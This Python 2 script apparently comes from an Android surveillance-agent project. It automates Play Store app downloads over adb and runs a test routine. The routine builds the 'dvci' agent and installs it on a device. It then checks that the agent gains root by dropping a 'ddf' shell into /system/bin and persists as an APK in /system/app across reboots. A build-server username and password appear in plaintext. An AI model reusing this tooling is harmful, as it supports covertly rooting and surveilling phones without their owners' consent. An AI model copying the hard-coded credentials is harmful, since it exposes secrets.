import argparse
import sys
import os
import re

from time import sleep
# our files
from RiteMobile.Android import adb

from RiteMobile.Android.commands_device import CommandsDevice

from RiteMobile.Android.apk import apk_dataLoader
from RiteMobile.Android.utils import superuserutils

sys.path.append("/home/zad/work/devel/test-rite/")


def main(args):
    commands_dev = CommandsDevice()

    if args.init:
        print "Init!"
        commands_dev.init_device()

    retrive_app_list(commands_dev, "assets/list_links.txt", "/Volumes/SHARE/QA/SVILUPPO/PlayStoreApps/", args.line)
  #  print "Test Execution success:%s" % test_local_install(device, res, wait_root=False)
  #  print "Test Execution success:%s" % test_local_install(device, res, persistent=False)
  #  print "Test Execution success:%s" % test_local_install(device, res)


def set_auto_rotate_enabled(state, device=None):
    s = 0
    if state:
        s = 1
    cmd = " content insert --uri content://settings/system --bind name:s:accelerometer_rotation --bind value:i:%d" % s
    return device.execute_cmd(cmd)


def retrive_app_list(device, fname, local_path, from_line=1):
    if not superuserutils.install_ddf_shell(device.device_serialno):
        exit()

    set_auto_rotate_enabled(False, device)
    count = 0
    with open(fname) as f:
        for line in f:
            count += 1
            if count < from_line:
                continue
            if "https://play.google.com/store/apps/" in line:
                r = re.compile('\?id=(.*?)&rdid')
                m = r.search(line)
                if m:
                    app = m.group(1)
                    market_url="market://details?id=" + app
                    print "ready to get app=%s %s" % (app,market_url)
                    get_app(device, market_url, app, local_path)
    set_auto_rotate_enabled(True, device)


def check_remote_app_installed(name, timeout=1, device=None):
    while timeout > 0:
        packages = device.get_packages()
        if len(packages) > 0:
            for p in packages:
                if p == name:
                    return 1
        sleep(1)
        timeout -= 1
    print "Timout checking process %s " % name
    return -1


def check_remote_activity(name, timeout=1, device=None):
    while timeout > 0:
        cmd = "dumpsys activity"
        cmd = device.execute_cmd(cmd)
        match = re.findall('mFocusedActivity+:.*', cmd)
        if len(match) > 0:
            if match[0].find(name) != -1:
                return True
        sleep(1)
        timeout -= 1
    print "Timout checking activity %s " % name
    return False


def isDownloading(device, timeout=2):
    """
    com.android.providers.downloads/.DownloadService
    ServiceRecord
    dumpsys activity services
    /data/data/com.android.providers.downloads/cache/
    adb shell  "dumpsys activity services" | grep com.android.providers.downloads/.DownloadService | grep ServiceRecord
    """
    while timeout:
        result = device.execute_cmd("dumpsys activity services")
        if len(result) > 0:
            for p in result.split():
                if result.find("ServiceRecord")!=-1:
                    if result.find("DownloadService")!=-1:
                        if result.find("com.android.providers.downloads")!=-1:
                            return True
        timeout -= 1
        sleep(1)
    return False

def install_by_gapp(url, app, device=None):
    if check_remote_app_installed(app, 3, device) != 1:
        device.open_url(url)
        if check_remote_activity("com.android.vending/com.google.android.finsky.activities.MainActivity", timeout=60, device=device):
            for i in range(10):
                device.press_key_dpad_up()
            for i in range(2):
                device.press_key_dpad_down()
            device.press_key_dpad_center()
            for i in range(25):
                if check_remote_activity("com.android.vending/com.google.android.finsky.activities.AppsPermissionsActivity", timeout=5, device=device):
                    device.press_key_dpad_down()
                else:
                    break
            device.press_key_dpad_center()
            if isDownloading(device, 5):
                timeout = 3360
                time_checked = 0
                while timeout>0:
                    if not isDownloading(device, 5):
                        if time_checked == 5:
                            break
                        else:
                            time_checked += 1
                    else:
                        time_checked = 0
                    timeout -= 5
                old_pid = check_remote_app_installed(app, 60, device)
                if old_pid == -1:
                    res = "Failed to install %s \n" % app
                    print res
                    return False
            else:
                res = "Failed to install %s \n" % app
                print res
                return False
    return True

def kill_app(app, device=None):
    cmd = "am force-stop %s" % app
    return device.execute_cmd(cmd)

def get_app(device, url, app_name,local_path):
    device.press_key_home()
    device.unlock_screen()
    kill_app("com.android.vending", device=device)
    sleep(3)
    if device.install_by_gapp(url, app_name):
        print "app_name %s installed" % app_name
        if adb.get_app_apk(app_name, local_path, device.device_serialno) != -1:
            print "apk %s retrived" % app_name
        else:
            print "failed to retrive apk %s" % app_name
        if app_name.find("com.google") == -1:
            device.uninstall_package(app_name)
        return
    print "app_name %s failed" % app_name


def test_local_install(device, results, reboot=False, persistent=True, wait_root=True):
    print "##################################################"
    print "#### STAGE 1 : TESTING Local Installation    #####"
    print "# reboot=%s persistent=%s wait Root=%s #" % (reboot, persistent, wait_root)
    print "##################################################"

    dev = device.serialno
    step = 1
    demo = True
    factory = 'RCS_0000001546'
    app_name = "autotest%s" % dev
    apk_out_name = 'assets/%s.default.apk' % app_name
    json_to = "build.%s.json" % app_name
    if demo:
        json = "build.demo.json"
    else:
        json = "build.nodemo.json"

    print "#STEP %d BUILD AGENT \"%s\" " % (step, apk_out_name)
#   commands.can_ping_google(dev)
    commands_dev = CommandsDevice(dev_serialno=dev)
    commands_dev.modify_json_app_name(app_name, json_to, json)
    commands_dev.build_apk_ruby(rebuild=False, user="zenobatch", password="castoreP123", server="castore",
                                conf_json_filename=json_to, factory_id=factory, apk_path_and_filename=apk_out_name)
    if not os.path.exists(apk_out_name):
        print "ERROR, cannot build apk"
        exit(0)

    step += 1

    device.unlock()
    print "#STEP %d GET ZYGOTE " % step
    zygote_pid = device.check_remote_process("zygote", 30)
    if zygote_pid == -1:
        res = "step %d: Fail to get zygote pid \n" % step
        print res
        results += res
        return False
    step += 1
    print "#STEP %d INSTALLING AGENT" % step
    agent = apk_dataLoader.get_apk('agent')
    device.install(apk_out_name)
    step += 1

    print "#STEP %d LAUNCHING AGENT" % step
    if agent.start_default_activity(dev).find("can't find") != -1:
        res = "step %d: fail to launch\n" % step
        print res
        results += res
        return False
    step += 1

    print "#STEP %d WAIT AGENT " % step
    old_pid = device.check_remote_process("com.android.dvci", 30)
    if old_pid == -1:
        res = "step %d: Fail to run the agent \n" % step
        print res
        results += res
        return False
    step += 1


    print "#STEP %d EXIT AGENT GUI" % step
    device.press_key_home()
    step += 1

    if wait_root:
        print "#STEP %d WAIT LOCAL ROOT" % step
        if not device.check_remote_file("ddf", "/system/bin", timeout=180):
            res = "step %d: Root not acquired\n" % step
            print res
            results += res
            return results
        step += 1

    if wait_root and persistent:
        print "#STEP %d CHECK Persistency" % step
        if not device.check_remote_file("StkDevice.apk", "/system/app", timeout=20):
            res = "step %d: check Persistence failed\n" % step
            print res
            results += res
            reboot = False
        step += 1

        print "#STEP %d CHECK change of pid %s" % (step, old_pid)
        if not device.check_remote_process_change_pid("com.android.dvci", timeout=40, pid=old_pid):
            res = "step %d: check pid change failed\n" % step
            print res
            results += res
            reboot = False
        step += 1


    if reboot:
        print "#STEP %d Reboot before unistall" % step
        device.reboot()
        if device.check_remote_process("com.android.dvci", 30) == -1:
            res = "step %d: reboot failed\n" % step
            print res
            results += res
            return results
    step += 1

    print "#STEP %d RUN UNISTALL" % step
    device.uninstall_with_calc()
    step += 1

    if not wait_root:
        print "#STEP %d WAIT UNISTALL DIALOG" % step
        if not device.check_remote_activity("UninstallerActivity", timeout=60):
            res = "step %d: process dvci still running\n" % step
            print res
            results += res
            return results
        else:
            device.press_key_tab()
            device.press_key_tab()
            device.press_key_enter()
            sleep(4)
        step += 1


    print "#STEP %d CHECK UNISTALL" % step
    if not device.check_remote_process_died("com.android.dvci", timeout=60):
        res = "step %d:UNISTALL fail, process dvci still running\n" % step
        print res
        results += res
        return results
    step += 1

    if wait_root and persistent:
        if not device.check_remote_file("StkDevice.apk", "/system/app", timeout=5):
            res = "step %d: check unistall Persistence failed\n" % step
            print res
            results += res
            return results
        step += 1

    new_zygote_pid = device.check_remote_process("zygote", 30)
    if zygote_pid != new_zygote_pid:
        res = "step %d: Test failed zygote rebooted!!! \n" % step
        print res
        results += res
        return False

    results += "success with reboot=%s persistent=%s wait Root=%s" % (reboot, persistent,wait_root)
    return results


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Rite apk downlaoder.')
    parser.add_argument('-l', '--line', required=False, default=1)
    parser.add_argument('-i', '--init', required=False, action='store_true')
    args = parser.parse_args()
    main(args)
